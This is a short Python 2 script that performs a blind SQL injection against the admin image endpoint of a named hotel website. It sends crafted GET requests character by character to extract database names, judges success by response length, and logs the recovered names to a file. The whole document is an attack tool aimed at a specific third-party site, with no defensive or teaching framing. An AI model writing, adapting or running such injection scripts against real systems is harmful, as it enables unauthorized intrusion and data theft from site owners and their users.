#!/usr/bin/env python

# coding: UTF-8 （๑•̀ㅂ•́)و✧

__author__ = 'T1m0n'

# http://www.xmairhotels.com/admin/ImageShow.asp?imgKey=20100119155428' AND SUBSTRING(@@version,1,1)='i' and '1'='1



import httplib



headers = {

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',

    'User-Agent': 'Mozilla / 5.0(WindowsNT6.3;Win64;x64;rv:44.0) Gecko / 20100101Firefox / 44.0',

    'Host': 'www.xmairhotels.com'

}



# db = []

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.-*'

for db_number in range(0, 185):

    db_name = ''

    flag = True

    for i in xrange(1, 29):

        if flag:

            for payload in payloads:

                poc = "SUBSTRING(db_name(%d),%d,1)='%s'" % (db_number, i, payload)

                url = "/admin/ImageShow.asp?imgKey=20100119155428%27%20AND%20" + poc + "%20and%20%271%27=%271"

                conn = httplib.HTTPConnection('www.xmairhotels.com')

                conn.request('GET', url, None, headers)

                text = conn.getresponse().read()

                conn.close()

                print '.',

                if len(text) > 224:

                    print payload

                    db_name += payload

                    break

                if payload == '*':

                    flag = False

                    print db_name

                    with open('db_name.txt', 'a+') as file:

                        file.write(db_name + '\n')





print 'Down'
